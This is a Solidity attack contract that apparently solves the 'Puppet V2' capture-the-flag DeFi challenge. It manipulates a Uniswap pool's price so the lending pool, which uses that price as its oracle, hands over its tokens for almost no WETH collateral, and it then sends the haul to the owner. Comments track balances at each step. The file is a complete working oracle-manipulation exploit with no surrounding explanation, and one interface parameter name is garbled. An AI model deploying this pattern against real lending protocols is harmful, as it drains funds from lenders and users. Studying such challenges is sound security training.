// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.6.0;

import "./PuppetV2Pool.sol";

// The ERC20 interface is already declared in PuppetV2Pool but is lacks the approve() function
interface MyIERC20 {
    function transfer(
        address to,
        uint256 amUniswapV2Libraryount
    ) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external returns (uint256);

    function deposit() external payable;
}

contract PuppetV2Attack {
    address public uniswapRouter;
    PuppetV2Pool public lendingPool;
    MyIERC20 public token;
    address public owner;

    constructor(address _router, address _pool, address _token) public payable {
        uniswapRouter = _router;
        lendingPool = PuppetV2Pool(_pool);
        token = MyIERC20(_token);
        owner = msg.sender;
    }

    function attack(
        uint256 amount,
        MyIERC20 weth,
        address[] memory path1,
        address[] memory path2
    ) public {
        // Approve the Uniswap Router for all tokens
        token.approve(uniswapRouter, 2 ** 256 - 1);

        /**
         * Contract has 10.000 tokens and 19 ETH
         * Uniswap pool has 100 tokens and 10 ETH
         * LendingPool has 1.000.000 tokens and 0 WETH
         */

        // SWAP 10.000 tokens for ETH
        swapTokensForETH(amount, path1);

        /**
         * Contract has 0 tokens and 28.9 ETH
         * Uniswap pool has 10.100 tokens and 0.1 ETH
         * LendingPool has 1.000.000 tokens and 0 WETH
         */

        // Calculate collateral for borrowing 500.000 tokens from lendingPool --> 14.7 WETH
        uint256 collateral = lendingPool.calculateDepositOfWETHRequired(
            500000e18
        );

        // SWAP 15 ETH for 15 WETH and approve it for the lendingPool
        weth.deposit{value: 15 ether}();
        weth.approve(address(lendingPool), collateral);

        // Borrow 500.000 tokens from the lendingPool
        lendingPool.borrow(500000e18);

        /**
         * Contract has 500.000 tokens, 13.9 ETH and 0.3 WETH
         * Uniswap pool has 10.100 tokens and 0.1 ETH
         * LendingPool has 500.000 tokens and 14.7 WETH
         */

        // SWAP 500.000 tokens for ETH
        swapTokensForETH(500000e18, path1);

        /**
         * Contract has 0 tokens, 13.998 ETH and 0.3 WETH
         * Uniswap pool has 510.100 tokens and 0.0002 ETH
         * LendingPool has 500.000 tokens and 14.7 WETH
         */

        // Calculate collateral for borrowing 500.000 tokens from lendingPool --> 0.006 WETH
        uint256 collateral2 = lendingPool.calculateDepositOfWETHRequired(
            500000e18
        );

        // Approve the lendingPool for collateral and borrow 500.000 tokens.
        weth.approve(address(lendingPool), collateral2);
        lendingPool.borrow(500000e18);

        /**
         * Contract has 500.000 tokens, 13.998 ETH and 0.294 WETH
         * Uniswap pool has 510.100 tokens and 0.0002 ETH
         * LendingPool has 0 tokens and 14.7 WETH
         */

        // SWAP 5 ETH for tokens
        swapETHForTokens(5 ether, path2);

        /**
         * Contract has 1.009.898 tokens, 8.998 ETH and 0.294 WETH
         * Uniswap pool has 202 tokens and 5 ETH
         * LendingPool has 0 tokens and 14.7 WETH
         */

        uint256 tokenBalance = token.balanceOf(address(this));
        token.transfer(owner, tokenBalance);
    }

    function swapTokensForETH(uint256 amount, address[] memory path) private {
        // The amountOutMin should be higher to avoid front-running but we'll skip for simplicity purposes
        (bool sent, ) = uniswapRouter.call(
            abi.encodeWithSignature(
                "swapExactTokensForETH(uint256,uint256,address[],address,uint256)",
                amount, // amountIn
                1, // amountOutMin (wei)
                path, // path (DVT, WETH)
                address(this), // to
                2 ** 256 - 1 // deadline
            )
        );
        require(sent);
    }

    function swapETHForTokens(uint256 amount, address[] memory path) private {
        // The amountOutMin should be higher to avoid front-running but we'll skip for simplicity purposes
        (bool sent, ) = uniswapRouter.call{value: amount}(
            abi.encodeWithSignature(
                "swapExactETHForTokens(uint256,address[],address,uint256)",
                1, // amountOutMin (wei)
                path, // path (WETH, DVT)
                address(this), // to
                2 ** 256 - 1 // deadline
            )
        );
        require(sent);
    }

    receive() external payable {}
}
